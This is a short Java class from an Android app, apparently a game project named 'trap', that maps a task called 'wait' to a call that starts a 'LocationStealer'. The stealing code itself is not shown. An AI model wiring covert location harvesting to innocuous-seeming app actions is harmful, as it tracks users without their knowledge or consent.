package de.hpi3d.gamepgrog.trap.tasks;

import android.app.Application;

import de.hpi3d.gamepgrog.trap.android.LocationStealer;
import de.hpi3d.gamepgrog.trap.future.BiConsumer;

public class TaskInitializerManager {

    private static TaskInitializer locationInitializer =
            (app, task) -> LocationStealer.startStealing(app);

    public static TaskInitializer getInitializerFor(Task task) {
        switch (task.getName()) {
            case "wait":
                return locationInitializer;
            default:
                throw new UnsupportedOperationException("There is no Initializer for this task");
        }
    }

    public interface TaskInitializer extends BiConsumer<Application, Task> {}
}
